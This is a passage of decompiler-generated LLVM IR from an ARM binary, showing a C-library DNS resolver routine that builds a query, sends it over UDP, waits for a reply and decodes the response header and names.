  %v3_1f9d0 = inttoptr i32 %v2_1f9d0 to i32*
  %v4_1f9d0 = load i32, i32* %v3_1f9d0, align 4
  store i32 %v4_1f9d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1f9dc

dec_label_pc_1f9dc:                               ; preds = %dec_label_pc_1f9a0.dec_label_pc_1f9dc_crit_edge, %dec_label_pc_1f9ac
  %v2_1fa20 = phi i32 [ %v0_1f9b4, %dec_label_pc_1f9ac ], [ %v0_1f9e4.pre, %dec_label_pc_1f9a0.dec_label_pc_1f9dc_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v6_1f9cc, %dec_label_pc_1f9ac ], [ %stack_var_-464.0, %dec_label_pc_1f9a0.dec_label_pc_1f9dc_crit_edge ]
  %stack_var_-468.1 = phi i32 [ %v4_1f9d0, %dec_label_pc_1f9ac ], [ %stack_var_-468.0, %dec_label_pc_1f9a0.dec_label_pc_1f9dc_crit_edge ]
  %stack_var_-476.1 = phi i32 [ %v2_1f9bc, %dec_label_pc_1f9ac ], [ %stack_var_-476.0, %dec_label_pc_1f9a0.dec_label_pc_1f9dc_crit_edge ]
  store i32 30180, i32* %r3.global-to-local, align 4
  %v2_1f9e4 = add i32 %v2_1fa20, 30180
  %v3_1f9e4 = inttoptr i32 %v2_1f9e4 to i32*
  %v4_1f9e4 = load i32, i32* %v3_1f9e4, align 4
  store i32 %v4_1f9e4, i32* %r2.global-to-local, align 4
  store i32 30176, i32* %r3.global-to-local, align 4
  %v3_1f9ec = icmp uge i32 %stack_var_-468.1, %v4_1f9e4
  store i1 %v3_1f9ec, i1* %cpsr_c.global-to-local, align 1
  %v2_1f9f0 = add i32 %v2_1fa20, 30176
  %v3_1f9f0 = inttoptr i32 %v2_1f9f0 to i32*
  %v4_1f9f0 = load i32, i32* %v3_1f9f0, align 4
  store i32 %v4_1f9f0, i32* %r3.global-to-local, align 4
  br i1 %v3_1f9ec, label %bb221, label %bb222

bb221:                                            ; preds = %dec_label_pc_1f9dc
  br label %bb222

bb222:                                            ; preds = %dec_label_pc_1f9dc, %bb221
  %v0_1f9fc = phi i32 [ %stack_var_-468.1, %dec_label_pc_1f9dc ], [ 0, %bb221 ]
  %v3_1f9fc = mul i32 %v0_1f9fc, 28
  %v4_1f9fc = add i32 %v3_1f9fc, %v4_1f9f0
  store i32 %v4_1f9fc, i32* %r3.global-to-local, align 4
  %v1_1fa08 = add i32 %stack_var_-464.1, 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_1fa14 = urem i32 %v1_1fa08, 65536
  store i32 29092, i32* %r1.global-to-local, align 4
  %v1_1fa20 = trunc i32 %v1_1fa08 to i16
  %v4_1fa20 = add i32 %v2_1fa20, 1152
  %v5_1fa20 = inttoptr i32 %v4_1fa20 to i16*
  store i16 %v1_1fa20, i16* %v5_1fa20, align 2
  store i32 %v0_1f9fc, i32* %r2.global-to-local, align 4
  %v1_1fa28 = load i32, i32* @r8, align 4
  %v2_1fa28 = load i32, i32* %r1.global-to-local, align 4
  %v3_1fa28 = add i32 %v2_1fa28, %v1_1fa28
  %v4_1fa28 = inttoptr i32 %v3_1fa28 to i32*
  store i32 %v0_1f9fc, i32* %v4_1fa28, align 4
  %v0_1fa2c = load i32, i32* %r3.global-to-local, align 4
  %v1_1fa30 = inttoptr i32 %v0_1fa2c to i32*
  %v2_1fa30 = load i32, i32* %v1_1fa30, align 4
  %v3_1fa30 = add i32 %v0_1fa2c, 4
  %v4_1fa30 = inttoptr i32 %v3_1fa30 to i32*
  %v5_1fa30 = load i32, i32* %v4_1fa30, align 4
  store i32 %v5_1fa30, i32* %r1.global-to-local, align 4
  %v6_1fa30 = add i32 %v0_1fa2c, 8
  %v7_1fa30 = inttoptr i32 %v6_1fa30 to i32*
  %v8_1fa30 = load i32, i32* %v7_1fa30, align 4
  store i32 %v8_1fa30, i32* %r2.global-to-local, align 4
  %v9_1fa30 = add i32 %v0_1fa2c, 12
  %v10_1fa30 = inttoptr i32 %v9_1fa30 to i32*
  %v11_1fa30 = load i32, i32* %v10_1fa30, align 4
  store i32 %v11_1fa30, i32* %r3.global-to-local, align 4
  %v4_1fa38 = trunc i32 %v2_1fa30 to i16
  store i16 %v4_1fa38, i16* %stack_var_-104, align 2
  %v3_1fa3c = add i32 %v0_1fa2c, 20
  %v4_1fa3c = inttoptr i32 %v3_1fa3c to i32*
  %v5_1fa3c = load i32, i32* %v4_1fa3c, align 4
  store i32 %v5_1fa3c, i32* %r1.global-to-local, align 4
  %v6_1fa3c = add i32 %v0_1fa2c, 24
  %v7_1fa3c = inttoptr i32 %v6_1fa3c to i32*
  %v8_1fa3c = load i32, i32* %v7_1fa3c, align 4
  store i32 %v8_1fa3c, i32* %r2.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_1fa50 = load i32, i32* @r8, align 4
  %v2_1fa50 = add i32 %v0_1fa50, 52
  %v3_1fa50 = inttoptr i32 %v2_1fa50 to i32*
  %v4_1fa50 = load i32, i32* %v3_1fa50, align 4
  store i32 129628, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1fa50)
  store i32 %v2_1fa5c, i32* @r6, align 4
  %v0_1fa60 = load i32, i32* @fp, align 4
  store i32 %v0_1fa60, i32* %r1.global-to-local, align 4
  store i32 512, i32* %r2.global-to-local, align 4
  %v0_1fa68 = load i32, i32* @sl, align 4
  %v3_1fa6c = inttoptr i32 %v0_1fa68 to i8*
  %v4_1fa6c = call i32 @__GI_memset(i8* %v3_1fa6c, i32 %v0_1fa60, i32 512)
  %v0_1fa70 = load i32, i32* @fp, align 4
  store i32 %v0_1fa70, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v4_1fa7c = call i32 @__GI_memset(i8* %v3_1fa7c, i32 %v0_1fa70, i32 48)
  store i32 %v3_1fa14, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  %v0_1fa8c = load i32, i32* @sl, align 4
  store i32 %v0_1fa8c, i32* %r1.global-to-local, align 4
  store i32 512, i32* %r2.global-to-local, align 4
  store i32 %v3_1fa14, i32* %stack_var_-192, align 4
  %v6_1faa0 = call i32 @__encode_header(i32* nonnull %stack_var_-192, i32 %v0_1fa8c, i32 512, i32 %v3_1fa14, i32 %v3_1fa14)
  store i32 %v6_1faa0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1faa4 = icmp slt i32 %v6_1faa0, 0
  br i1 %v1_1faa4, label %dec_label_pc_1ff80, label %dec_label_pc_1faac

dec_label_pc_1faac:                               ; preds = %bb222
  store i32 %v0_1f824, i32* @ip, align 4
  store i32 %v1_1f86c, i32* @r5, align 4
  %v0_1fabc = load i32, i32* @sl, align 4
  %v2_1fabc = add i32 %v0_1fabc, %v6_1faa0
  store i32 %v2_1fabc, i32* %r1.global-to-local, align 4
  %v1_1fac0 = sub i32 512, %v6_1faa0
  store i32 %v1_1fac0, i32* %r2.global-to-local, align 4
  store i32 %v1_1f86c, i32* %stack_var_-60, align 4
  %v4_1facc = call i32 @__encode_question(i32* nonnull %stack_var_-60, i32 %v2_1fabc, i32 %v1_1fac0)
  store i32 %v4_1facc, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1fad0 = icmp slt i32 %v4_1facc, 0
  br i1 %v1_1fad0, label %dec_label_pc_1ff80, label %dec_label_pc_1fad8

dec_label_pc_1fad8:                               ; preds = %dec_label_pc_1faac
  %v3_1fadc = load i16, i16* %stack_var_-104, align 2
  %v4_1fadc = sext i16 %v3_1fadc to i32
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_1fae8 = call i32 @socket(i32 %v4_1fadc, i32 2, i32 17)
  store i32 %v3_1fae8, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1faec = icmp slt i32 %v3_1fae8, 0
  br i1 %v1_1faec, label %dec_label_pc_1ff58, label %dec_label_pc_1faf8

dec_label_pc_1faf8:                               ; preds = %dec_label_pc_1fad8
  store i32 28, i32* %r2.global-to-local, align 4
  store i32 %v2_1fa34, i32* %r1.global-to-local, align 4
  %v3_1fb00 = call i32 @__libc_connect(i32 %v3_1fae8, i32 %v2_1fa34, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1fb04 = icmp slt i32 %v3_1fb00, 0
  br i1 %v1_1fb04, label %dec_label_pc_1ff58, label %dec_label_pc_1fb0c

dec_label_pc_1fb0c:                               ; preds = %dec_label_pc_1faf8
  %v0_1fb0c = load i32, i32* @r5, align 4
  %v1_1fb0c = load i32, i32* @r4, align 4
  %v2_1fb0c = add i32 %v1_1fb0c, %v0_1fb0c
  store i32 %v2_1fb0c, i32* %r2.global-to-local, align 4
  %v0_1fb10 = load i32, i32* @fp, align 4
  store i32 %v0_1fb10, i32* %r3.global-to-local, align 4
  %v0_1fb18 = load i32, i32* @sl, align 4
  store i32 %v0_1fb18, i32* %r1.global-to-local, align 4
  %v4_1fb1c = call i32 @__libc_send(i32 %v3_1fae8, i32 %v0_1fb18, i32 %v2_1fb0c, i32 %v0_1fb10)
  store i32 1154, i32* %r3.global-to-local, align 4
  %v0_1fb24 = load i32, i32* @r8, align 4
  %v2_1fb24 = add i32 %v0_1fb24, 1154
  %v3_1fb24 = inttoptr i32 %v2_1fb24 to i8*
  %v4_1fb24 = load i8, i8* %v3_1fb24, align 1
  %v6_1fb24 = zext i8 %v4_1fb24 to i32
  store i32 %v6_1fb24, i32* %r2.global-to-local, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_1fb2c = mul nuw nsw i32 %v6_1fb24, 1000
  store i32 %v2_1fb2c, i32* @r4, align 4
  store i32 %v2_1fb30, i32* @r5, align 4
  br label %dec_label_pc_1fb34

dec_label_pc_1fb34:                               ; preds = %thread-pre-split, %dec_label_pc_1fb0c
  %v0_1fb44 = phi i32 [ %v1_1fb80, %thread-pre-split ], [ %v2_1fb2c, %dec_label_pc_1fb0c ]
  store i32 %v3_1fae8, i32* %stack_var_-48, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %v0_1fb44, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v8_1fb54 = call i32 @__GI_poll(i32 %v2_1fb30, i32 1, i32 %v0_1fb44, i32 1, i32 %v3_1fae8, i32 1)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_1fb5c = load i32, i32* @sl, align 4
  store i32 %v0_1fb5c, i32* %r1.global-to-local, align 4
  store i32 512, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %tmp223 = icmp slt i32 %v8_1fb54, 1
  br i1 %tmp223, label %dec_label_pc_1ff58, label %dec_label_pc_1fb70

dec_label_pc_1fb70:                               ; preds = %dec_label_pc_1fb34
  %v5_1fb70 = call i32 @__libc_recv(i32 %v3_1fae8, i32 %v0_1fb5c, i32 512, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v2_1fb74 = icmp ugt i32 %v5_1fb70, 10
  store i1 %v2_1fb74, i1* %cpsr_c.global-to-local, align 1
  %v8_1fb7c = icmp sgt i32 %v5_1fb70, 11
  br i1 %v8_1fb7c, label %dec_label_pc_1fba8, label %dec_label_pc_1fb80

dec_label_pc_1fb80:                               ; preds = %dec_label_pc_1fba8, %dec_label_pc_1fbc4, %dec_label_pc_1fb70
  %v0_1fb80 = load i32, i32* @r4, align 4
  %v1_1fb80 = add i32 %v0_1fb80, -1000
  store i32 %v1_1fb80, i32* @r4, align 4
  %v7_1fb80 = icmp eq i32 %v0_1fb80, 1000
  %tmp286 = zext i1 %v7_1fb80 to i32
  %. = xor i32 %tmp286, 1
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1fb90 = icmp slt i32 %v5_1fb70, 0
  br i1 %v1_1fb90, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_1fb80
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1ff58

thread-pre-split:                                 ; preds = %dec_label_pc_1fb80
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1fb80, label %dec_label_pc_1ff58, label %dec_label_pc_1fb34

dec_label_pc_1fba8:                               ; preds = %dec_label_pc_1fb70
  %v0_1fba8 = load i32, i32* @sl, align 4
  store i32 %v2_1fa5c, i32* %r1.global-to-local, align 4
  %v2_1fbb0 = inttoptr i32 %v0_1fba8 to i8*
  %v3_1fbb0 = call i32 @__decode_header(i8* %v2_1fbb0, i32 %v2_1fa5c)
  %v3_1fbb4 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_1fbb4, i32* %r3.global-to-local, align 4
  %v3_1fbbc = icmp uge i32 %v3_1fbb4, %v3_1fa14
  store i1 %v3_1fbbc, i1* %cpsr_c.global-to-local, align 1
  %v9_1fbbc = icmp eq i32 %v3_1fbb4, %v3_1fa14
  br i1 %v9_1fbbc, label %dec_label_pc_1fbc4, label %dec_label_pc_1fb80

dec_label_pc_1fbc4:                               ; preds = %dec_label_pc_1fba8
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1fbc8, label %dec_label_pc_1fb80, label %dec_label_pc_1fbd0

dec_label_pc_1fbd0:                               ; preds = %dec_label_pc_1fbc4
  store i32 %tmp164, i32* %r2.global-to-local, align 4
  store i32 %v1_1fbd4, i32* %r3.global-to-local, align 4
  store i1 %v2_1fbd8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_1fbd4.cmp, label %dec_label_pc_1fc14, label %dec_label_pc_1fbe0

dec_label_pc_1fbe0:                               ; preds = %dec_label_pc_1fbd0
  store i32 %v4_1f89c, i32* @r1, align 4
  store i1 %v2_1fbe4, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1fbe4, label %dec_label_pc_1fc00, label %dec_label_pc_1fbec

dec_label_pc_1fbec:                               ; preds = %dec_label_pc_1fbe0
  store i32 %v4_1f960, i32* %r2.global-to-local, align 4
  %v1_1fbf0 = add i32 %v4_1f960, -1
  store i32 %v1_1fbf0, i32* %r3.global-to-local, align 4
  %v0_1fbf4 = load i32, i32* @r7, align 4
  %v3_1fbf4 = icmp uge i32 %v0_1fbf4, %v1_1fbf0
  store i1 %v3_1fbf4, i1* %cpsr_c.global-to-local, align 1
  %v5_1fbf8 = icmp slt i32 %v0_1fbf4, %v1_1fbf0
  br i1 %v5_1fbf8, label %.thread8, label %dec_label_pc_1fc00

.thread8:                                         ; preds = %dec_label_pc_1fbec
  %v7_1fbf8 = add i32 %v0_1fbf4, 1
  br label %dec_label_pc_1ff68

dec_label_pc_1fc00:                               ; preds = %dec_label_pc_1fbec, %dec_label_pc_1fbe0
  store i32 74804, i32* %r3.global-to-local, align 4
  %v0_1fc04 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_1fc44

dec_label_pc_1fc14:                               ; preds = %dec_label_pc_1fbd0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1fc14, label %dec_label_pc_1fc1c, label %dec_label_pc_1ff58

dec_label_pc_1fc1c:                               ; preds = %dec_label_pc_1fc14
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp218, label %dec_label_pc_1fc34, label %dec_label_pc_1fc4c

dec_label_pc_1fc34:                               ; preds = %dec_label_pc_1fc1c
  store i32 74752, i32* %r3.global-to-local, align 4
  %v0_1fc38 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_1fc44

dec_label_pc_1fc44:                               ; preds = %dec_label_pc_1fc00, %dec_label_pc_1fc34
  %storemerge3 = phi i32 [ %v0_1fc04, %dec_label_pc_1fc00 ], [ %v0_1fc38, %dec_label_pc_1fc34 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_1fc00 ], [ 4, %dec_label_pc_1fc34 ]
  %storemerge2 = load i32, i32* @global_var_32044.1421, align 4
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v3_1fc44 = add i32 %storemerge2, %storemerge3
  %v4_1fc44 = inttoptr i32 %v3_1fc44 to i32*
  store i32 %storemerge, i32* %v4_1fc44, align 4
  br label %dec_label_pc_1ffa8

dec_label_pc_1fc4c:                               ; preds = %dec_label_pc_1fc1c
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_1fc50.pre = load i32, i32* @sl, align 4
  store i32 12, i32* @r7, align 4
  %v2_1fc50 = add i32 %v0_1fc50.pre, 12
  store i32 %v2_1fc50, i32* @r4, align 4
  %v3_1fc50 = icmp ugt i32 %v0_1fc50.pre, -13
  store i1 %v3_1fc50, i1* %cpsr_c.global-to-local, align 1
  %v9_1fc50 = icmp eq i32 %v2_1fc50, 0
  br i1 %v9_1fc50, label %dec_label_pc_1ff58, label %dec_label_pc_1fc58

dec_label_pc_1fc58:                               ; preds = %dec_label_pc_1fc4c
  %v2_1fc60 = add i32 %v5_1fb70, -12
  store i32 %v2_1fc60, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp227 = icmp slt i32 %v2_1fc60, 1
  br i1 %tmp227, label %dec_label_pc_1ff58, label %dec_label_pc_1fc6c

dec_label_pc_1fc64thread-pre-split:               ; preds = %dec_label_pc_1fc88
  %v2_1fc9416 = add i32 %v2_1fc78, -1
  store i32 %v2_1fc9416, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp228 = icmp slt i32 %v2_1fc9416, 1
  br i1 %tmp228, label %dec_label_pc_1ff58, label %dec_label_pc_1fc6c

dec_label_pc_1fc6c:                               ; preds = %dec_label_pc_1fc58, %dec_label_pc_1fc64thread-pre-split
  %v1_1fc90 = phi i32 [ %v2_1fc9416, %dec_label_pc_1fc64thread-pre-split ], [ %v2_1fc60, %dec_label_pc_1fc58 ]
  %v0_1fc6c = phi i32 [ %v2_1fc80, %dec_label_pc_1fc64thread-pre-split ], [ %v2_1fc50, %dec_label_pc_1fc58 ]
  %v1_1fc6c = inttoptr i32 %v0_1fc6c to i8*
  %v2_1fc6c = load i8, i8* %v1_1fc6c, align 1
  %v3_1fc6c = zext i8 %v2_1fc6c to i32
  store i32 %v3_1fc6c, i32* %r3.global-to-local, align 4
  %v5_1fc6c = add i32 %v0_1fc6c, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1fc70 = icmp eq i8 %v2_1fc6c, 0
  store i32 %v5_1fc6c, i32* %r2.global-to-local, align 4
  %v2_1fc78 = sub i32 %v1_1fc90, %v3_1fc6c
  store i32 %v2_1fc78, i32* @lr, align 4
  %v2_1fc80 = add i32 %v3_1fc6c, %v5_1fc6c
  br i1 %v2_1fc70, label %dec_label_pc_1fc9c, label %dec_label_pc_1fc88

dec_label_pc_1fc88:                               ; preds = %dec_label_pc_1fc6c
  %v1_1fc7c = and i32 %v3_1fc6c, 192
  %v2_1fc88 = icmp eq i32 %v1_1fc7c, 192
  store i1 %v2_1fc88, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1fc88, label %.thread10, label %dec_label_pc_1fc64thread-pre-split

.thread10:                                        ; preds = %dec_label_pc_1fc88
  %v2_1fc8c = add i32 %v0_1fc6c, 2
  store i32 %v2_1fc8c, i32* %r2.global-to-local, align 4
  %v2_1fc90 = add i32 %v1_1fc90, -2
  store i32 %v2_1fc90, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1fc9c

dec_label_pc_1fc9c:                               ; preds = %dec_label_pc_1fc6c, %.thread10
  %v1_1fca8 = phi i32 [ %v2_1fc8c, %.thread10 ], [ %v5_1fc6c, %dec_label_pc_1fc6c ]
  %v0_1fc9c = phi i32 [ %v2_1fc90, %.thread10 ], [ %v1_1fc90, %dec_label_pc_1fc6c ]
  %v1_1fc9c = add i32 %v0_1fc9c, -3
  %v2_1fc9c = icmp ugt i32 %v0_1fc9c, 2
  store i1 %v2_1fc9c, i1* %cpsr_c.global-to-local, align 1
  %v3_1fc9c = sub i32 2, %v0_1fc9c
  %v4_1fc9c = and i32 %v3_1fc9c, %v0_1fc9c
  %v5_1fc9c = icmp slt i32 %v4_1fc9c, 0
  %v6_1fc9c = icmp slt i32 %v1_1fc9c, 0
  %v7_1fc9c = icmp eq i32 %v0_1fc9c, 3
  %v3_1fca0 = xor i1 %v6_1fc9c, %v5_1fc9c
  %v4_1fca0 = or i1 %v7_1fc9c, %v3_1fca0
  br i1 %v4_1fca0, label %dec_label_pc_1ff58, label %dec_label_pc_1fca4

dec_label_pc_1fca4:                               ; preds = %dec_label_pc_1fc9c
  %v1_1fca4 = sub i32 -8, %v0_1fc50.pre
  %v2_1fca8 = add i32 %v1_1fca8, %v1_1fca4
  store i32 %v2_1fca8, i32* %r3.global-to-local, align 4
  %v3_1fca8 = icmp ult i32 %v2_1fca8, %v1_1fca4
  store i1 %v3_1fca8, i1* %cpsr_c.global-to-local, align 1
  %v8_1fca8 = icmp slt i32 %v2_1fca8, 0
  br i1 %v8_1fca8, label %dec_label_pc_1ff58, label %dec_label_pc_1fccc

dec_label_pc_1fccc:                               ; preds = %dec_label_pc_1fca4
  %v2_1fcb4 = add i32 %v2_1fca8, 12
  store i32 1, i32* @r1, align 4
  store i32 %v2_1fcd8, i32* @r5, align 4
  %v1_1fcec = load i32, i32* @sb, align 4
  %v2_1fcec = inttoptr i32 %v1_1fcec to i32*
  store i32 0, i32* %v2_1fcec, align 4
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_1ff2c57, label %dec_label_pc_1fcf4, label %dec_label_pc_1ff30

dec_label_pc_1fcf4:                               ; preds = %dec_label_pc_1fccc, %dec_label_pc_1ff08
  %stack_var_-460.365 = phi i32 [ %v2_1ff10, %dec_label_pc_1ff08 ], [ %v2_1fcb4, %dec_label_pc_1fccc ]
  %stack_var_-452.062 = phi i32 [ %v1_1ff14, %dec_label_pc_1ff08 ], [ 0, %dec_label_pc_1fccc ]
  %stack_var_-480.261 = phi i32 [ %stack_var_-480.1, %dec_label_pc_1ff08 ], [ 1, %dec_label_pc_1fccc ]
  %v0_1fcf4 = load i32, i32* @sl, align 4
  store i32 %stack_var_-460.365, i32* @r1, align 4
  store i32 %v5_1fb70, i32* %r2.global-to-local, align 4
  store i32 %v2_1fcd4, i32* %r3.global-to-local, align 4
  store i32 256, i32* @r7, align 4
  %v5_1fd0c = call i32 @__decode_dotted(i32 %v0_1fcf4, i32 %stack_var_-460.365, i32 %v5_1fb70, i32 %v2_1fcd4, i32 256)
  store i32 %v5_1fd0c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1fd10 = icmp slt i32 %v5_1fd0c, 0
  br i1 %v1_1fd10, label %dec_label_pc_1fde0, label %dec_label_pc_1fd18

dec_label_pc_1fd18:                               ; preds = %dec_label_pc_1fcf4
  %v1_1fd20 = add i32 %v5_1fd0c, 10
  store i32 %v1_1fd20, i32* @fp, align 4
  %v2_1fd24 = sub i32 %v5_1fb70, %stack_var_-460.365
  %v2_1fd28 = sub i32 %v2_1fd24, %v1_1fd20
  store i32 %v2_1fd28, i32* %r3.global-to-local, align 4
  %v3_1fd28 = icmp uge i32 %v2_1fd24, %v1_1fd20
  store i1 %v3_1fd28, i1* %cpsr_c.global-to-local, align 1
  %v8_1fd28 = icmp slt i32 %v2_1fd28, 0
  br i1 %v8_1fd28, label %dec_label_pc_1fdd8.thread, label %dec_label_pc_1fd38

dec_label_pc_1fdd8.thread:                        ; preds = %dec_label_pc_1fd18
  store i32 %v2_1fd28, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1fde0

dec_label_pc_1fd38:                               ; preds = %dec_label_pc_1fd18
  %v2_1fd3c = call i32 @__GI_strdup(i8* %v1_1fd3c)
  %v0_1fd44 = load i32, i32* @r4, align 4
  %v2_1fd44 = add i32 %v0_1fd44, %stack_var_-460.365
  %v0_1fd48 = load i32, i32* @sl, align 4
  %v2_1fd48 = add i32 %v0_1fd48, %v2_1fd44
  store i32 %v2_1fd48, i32* %r1.global-to-local, align 4
  %v1_1fd4c = add i32 %v2_1fd48, 2
  %v1_1fd50 = add i32 %v2_1fd48, 4
  store i32 %v1_1fd50, i32* %r3.global-to-local, align 4
  %v1_1fd54 = add i32 %v2_1fd48, 5
  %v2_1fd54 = inttoptr i32 %v1_1fd54 to i8*
  %v3_1fd54 = load i8, i8* %v2_1fd54, align 1
  %v4_1fd54 = zext i8 %v3_1fd54 to i32
  %v2_1fd58 = inttoptr i32 %v1_1fd50 to i8*
  %v3_1fd58 = load i8, i8* %v2_1fd58, align 1
  %v4_1fd58 = zext i8 %v3_1fd58 to i32
  %v1_1fd5c = add i32 %v2_1fd48, 8
  %v2_1fd5c = inttoptr i32 %v1_1fd5c to i8*
  %v3_1fd5c = load i8, i8* %v2_1fd5c, align 1
  %v4_1fd5c = zext i8 %v3_1fd5c to i32
  %v1_1fd60 = add i32 %v2_1fd48, 7
  %v2_1fd60 = inttoptr i32 %v1_1fd60 to i8*
  %v3_1fd60 = load i8, i8* %v2_1fd60, align 1
  %v4_1fd60 = zext i8 %v3_1fd60 to i32
  store i32 %v4_1fd60, i32* %r2.global-to-local, align 4
  %v1_1fd68 = add i32 %v2_1fd48, 6
  %v2_1fd68 = inttoptr i32 %v1_1fd68 to i8*
  %v3_1fd68 = load i8, i8* %v2_1fd68, align 1
  %v4_1fd68 = zext i8 %v3_1fd68 to i32
  store i32 %v4_1fd68, i32* %r3.global-to-local, align 4
  %v1_1fd6c = add i32 %v2_1fd48, 9
  %v2_1fd6c = inttoptr i32 %v1_1fd6c to i8*
  %v3_1fd6c = load i8, i8* %v2_1fd6c, align 1
  %v4_1fd6c = zext i8 %v3_1fd6c to i32
  %v3_1fd74 = inttoptr i32 %v2_1fd48 to i8*
  %v4_1fd74 = load i8, i8* %v3_1fd74, align 1
  %v6_1fd74 = zext i8 %v4_1fd74 to i32
  %v1_1fd78 = add i32 %v2_1fd48, 3
  %v2_1fd78 = inttoptr i32 %v1_1fd78 to i8*
  %v3_1fd78 = load i8, i8* %v2_1fd78, align 1
  %v4_1fd78 = zext i8 %v3_1fd78 to i32
  store i32 %v4_1fd78, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_1fd7c = mul nuw i32 %v4_1fd58, 16777216
  %v5_1fd7c = or i32 %v4_1fd60, %v4_1fd7c
  store i32 %v5_1fd7c, i32* %r2.global-to-local, align 4
  %v2_1fd80 = inttoptr i32 %v1_1fd4c to i8*
  %v3_1fd80 = load i8, i8* %v2_1fd80, align 1
  %v4_1fd80 = zext i8 %v3_1fd80 to i32
  %v1_1fd84 = add i32 %v2_1fd48, 1
  %v2_1fd84 = inttoptr i32 %v1_1fd84 to i8*
  %v3_1fd84 = load i8, i8* %v2_1fd84, align 1
  %v4_1fd84 = zext i8 %v3_1fd84 to i32
  %v4_1fd88 = mul nuw nsw i32 %v4_1fd5c, 256
  %v5_1fd88 = or i32 %v4_1fd6c, %v4_1fd88
  store i32 %v5_1fd88, i32* @r6, align 4
  store i32 %v4_1fd54, i32* @r7, align 4
  %v4_1fd90 = mul nuw nsw i32 %v6_1fd74, 256
  %v5_1fd90 = or i32 %v4_1fd84, %v4_1fd90
  store i32 %v5_1fd90, i32* @lr, align 4
  %v4_1fd94 = mul nuw nsw i32 %v4_1fd80, 256
  %v5_1fd94 = or i32 %v4_1fd94, %v4_1fd78
  store i32 %v5_1fd94, i32* %r3.global-to-local, align 4
  store i32 %v2_1fd28, i32* @r5, align 4
  %v4_1fda0 = mul nuw nsw i32 %v4_1fd54, 65536
  %v5_1fda0 = or i32 %v5_1fd7c, %v4_1fda0
  %v4_1fda4 = mul nuw nsw i32 %v4_1fd68, 256
  %v5_1fda4 = or i32 %v5_1fda0, %v4_1fda4
  store i32 %v5_1fda4, i32* %r2.global-to-local, align 4
  %v1_1fda8 = add i32 %v2_1fd48, 10
  store i32 %v1_1fda8, i32* @r1, align 4
  %v1_1fdac = add i32 %v2_1fd44, 10
  store i32 %v1_1fdac, i32* @r4, align 4
  %v2_1fdb0 = sub i32 %v2_1fd28, %v5_1fd88
  %v3_1fdb0 = icmp uge i32 %v2_1fd28, %v5_1fd88
  store i1 %v3_1fdb0, i1* %cpsr_c.global-to-local, align 1
  %tmp230 = sub i32 0, %v2_1fdb0
  %v6_1fdb0 = and i32 %v2_1fd28, %tmp230
  %v7_1fdb0 = icmp slt i32 %v6_1fdb0, 0
  %v8_1fdb0 = icmp slt i32 %v2_1fdb0, 0
  store i32 %v2_1fd3c, i32* %stack_var_-144, align 4
  %v2_1fdd0 = xor i1 %v8_1fdb0, %v7_1fdb0
  br i1 %v2_1fdd0, label %dec_label_pc_1fde0, label %dec_label_pc_1fdd8

dec_label_pc_1fdd8:                               ; preds = %dec_label_pc_1fd38
  %v0_1fdd4 = load i32, i32* @fp, align 4
  %v2_1fdd4 = add i32 %v0_1fdd4, %v5_1fd88
  store i32 %v2_1fdd4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1fdd8 = icmp slt i32 %v2_1fdd4, 0
